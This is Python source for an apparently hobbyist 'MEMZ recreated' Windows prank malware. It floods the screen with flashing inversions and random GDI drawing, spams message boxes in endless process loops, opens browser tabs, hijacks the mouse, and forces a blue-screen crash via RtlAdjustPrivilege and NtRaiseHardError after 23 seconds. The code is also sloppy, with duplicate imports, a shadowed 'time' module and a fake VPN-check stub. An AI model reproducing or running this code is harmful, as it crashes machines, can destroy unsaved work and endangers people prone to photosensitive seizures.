from threading import Thread
import os    
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import randint
import winsound
import ctypes
import numpy as np
import sounddevice as sd
import messagebox
import time
import os
from time import time
from turtle import width
from win32api import *
from win32gui import *
from win32ui import * 
from ctypes import windll
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
import random
import time
from sys import exit
import multiprocessing
import pyautogui
import ctypes


messagebox.askyesno("error make by memegamerlol", "this is malware run?")

messagebox.askyesno("error made by memegamerlol","are you sure?")

messagebox.askyesno("warning EPILEPTIC","THIS MALWARE HAS FLASHING LIGHTS NOT FOR EPILEPTIC")

def bytebeat(t):
    
    return ((t>>12|t>>8)&63&t>>4) & 0xFF 

duration = 60  
sample_rate = 44100  

t_values = np.arange(0, duration * sample_rate)
audio_data = np.array([bytebeat(t) for t in t_values], dtype=np.int8) 

sd.play(audio_data, sample_rate)



desk = GetDC(0)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
print(x)
print(y)
for _ in range(500000):
            brush = CreateSolidBrush(RGB(
                randint(0, 255),
                randint(0, 255),
                randint(0, 255)
                )) #Creates a brush
            SelectObject(desk, brush) #Choose that we're drawing with our brush.
            PatBlt(desk, randint(0, x), randint(0, y), randint(0, 100), randint(0, 200), PATCOPY)
            DeleteObject(brush)
            #Sleep(1) #wait
ReleaseDC(desk, GetDesktopWindow())
DeleteDC(desk) #Deletes our DC.


# Define colors
red = 'red'
green = 'green'
purple = 'purple'

def flash_screen(color):
    hdc = GetDC(0)  # Get the screen as a Device Context object
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)  # Retrieve monitor size
    PatBlt(hdc, 0, 0, x, y, PATINVERT)  # Invert the device context
    time.sleep(0.1)  # Sleep for 100 milliseconds
    PatBlt(hdc, 0, 0, x, y, PATINVERT)  # Invert back to normal
    DeleteDC(hdc)  # Clean up memory

def check_vpn_status():
    # Replace this function with your actual VPN status check logic
    # For demonstration purposes, we'll assume VPN is down half the time
    return time.time() % 2 == 0

if __name__ == "__main__":
    for _ in range(210000):
        if check_vpn_status():
            flash_screen(green)  # VPN is up (steady green)
        else:
            flash_screen(red)  # VPN is down (blinking red)


websites = (

    "https://www.google.com/",
    "https://www.google.com/search?q=how+to+delete+system32&oq=how+to+delete+system32&aqs=chrome..69i57.6975j0j7&sourceid=chrome&ie=UTF-8",
    "cmd",
    "https://youtube.com/",
    "https://www.helloworld.org/",
    "https://www.google.com/search?q=Is+this+virus+good%3F&oq=Is+this+virus+good%3F&aqs=chrome..69i57.7116j0j7&sourceid=chrome&ie=UTF-8",
    "https://github.com/Kubzelll",
    "http://kubzel.pl/"
    
)

IconWarning = LoadIcon(None, 32515)
IconError = LoadIcon(None, 32513)

def open_web():
        for i in range(0,10):
            os.system("start " + str(choice(websites)))
        time.sleep(3)






def blinkscr():

    
    global time
    global timeSubtract
    x = 1920
    y = 1080

    try:
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        while True:
            PatBlt(HDC, 0,0,x,y, PATINVERT)
    except:
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        while True:
            PatBlt(HDC, 0,0,x,y, PATINVERT)



def warning_spam():
    while True:
        multiprocessing.Process(target = msgbox_thread).start()
        


def screen_puzzle():
    HDC = GetDC(0)
    sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
    x1 = rd(sw-100)
    y1 = rd(sh-100)
    x2 = rd(sw-100)
    y2 = rd(sw-100)

    width = rd(600)
    height = rd(600)
    while True:
       BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
    



def error_drawing():
    global time
    global timeSubstract
    HDC = GetDC(0)
    sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
    while True:
        DrawIcon(HDC, rd(sh), rd(sh), IconWarning)
        for i in range(0, 60):
            mouseX,mouseY = GetCursorPos()
            DrawIcon(HDC, mouseX, mouseY, IconError)
            Sleep(10)


def bsod():

    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successfull!")
    else:
        print("BSOD Failed...")


def msgbox_thread():
    while True:
        MessageBox("still using computer?", "lol", MB_OK | MB_ICONWARNING)

def first_msg():
    MessageBox("your computer is going to be destroyed enjoy", "enjoy", MB_OK | MB_ICONWARNING)
    pass


def running():
    if MessageBox("DONT RUN THIS IF U ARE EPILEPTIC This is harmless version of memz by Kubzel. Also be sure all files are saved to just don't lose unsaved files. Do you want to continue? ", "Memz reacreated", MB_YESNO | MB_ICONWARNING) == 7:
        MessageBox("OK, exiting", "OKe")
        exit()
    else:
        main()

def randomcursor():
    while True:
        h = random.randint(0,1080)
        w = random.randint(0,1920)
        pyautogui.click(h, w, duration=0.3)
        pyautogui.hotkey('winleft', "m")

    
def timer():
    time.sleep(23)
    bsod()
    

def main():
    while True:

        blinkscr_thread = multiprocessing.Process(target = blinkscr)
        time_thread = multiprocessing.Process(target = timer)
        openweb_thread = multiprocessing.Process(target = open_web)
        drawing_thead = multiprocessing.Process(target = error_drawing)
        firstmsg_thread = multiprocessing.Process(target = first_msg)
        warning = multiprocessing.Process(target = msgbox_thread)
        puzzle_thread = multiprocessing.Process(target = screen_puzzle)
        randomcursor_thread = multiprocessing.Process(target = randomcursor)
        firstmsg_thread.start()
        
        time_thread.start()
      #  randomcursor_thread.start()
        time.sleep(3)
        openweb_thread.start()
        firstmsg_thread.terminate()
        blinkscr_thread.start()
    #   time.sleep(2)
    #   blinkscr_thread.terminate()
        drawing_thead.start()
        warning.start()
        puzzle_thread.start()


    






if __name__ == "__main__":
    running()
